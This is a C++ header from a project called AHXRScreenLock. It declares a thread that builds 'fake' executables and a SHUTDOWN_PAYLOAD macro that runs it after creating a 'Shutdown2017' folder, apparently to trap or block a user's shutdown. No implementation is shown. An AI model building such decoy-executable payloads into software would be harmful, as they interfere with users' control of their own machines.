/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					<string>
#include					<Windows.h>

#define						SHUTDOWN_FOLDER_NAME		"Shutdown2017"

extern HANDLE				h_fake;
extern DWORD				hd_fake;
extern DWORD WINAPI			t_buildFake(LPVOID lpParameter);

#define						BUILD_FAKE_EXECUTABLES()	{ h_fake = CreateThread(0, 0, t_buildFake, 0, 0, &hd_fake); }
#define						SHUTDOWN_PAYLOAD()			{ if (createShutdownFolder()) BUILD_FAKE_EXECUTABLES(); }

extern bool					createShutdownFolder();
extern std::string			getFullShutdownDirectory();